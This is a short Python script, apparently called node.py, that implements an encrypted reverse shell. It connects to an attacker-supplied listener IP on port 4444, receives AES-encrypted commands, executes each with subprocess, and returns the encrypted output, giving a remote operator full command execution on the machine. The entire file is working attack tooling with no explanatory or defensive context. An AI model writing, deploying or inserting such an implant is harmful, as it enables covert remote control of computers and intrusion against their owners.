import socket
import subprocess
from crypto import encrypt, decrypt  # Import AES encryption logic

def connect_to_server(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Create a TCP socket
    s.connect((host, port)) # Connect to the server
    return s

def shell_loop(sock):
    while 1: # Continuously listen for commands
        cmd = decrypt(sock.recv(1024)).decode() # Receive and decrypt command from server
        if cmd.lower() in ['exit', 'quit']: # Check for exit commands
            break
        result = subprocess.getoutput(cmd) # Execute the command and get the output
        sock.send(encrypt(result.encode())) # Encrypt and send the result back to the server

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 2:
        print("Usage: python node.py <listener_ip>")
        sys.exit(1)

    host = sys.argv[1]
    port = 4444
    sock = connect_to_server(host, port)
    shell_loop(sock)
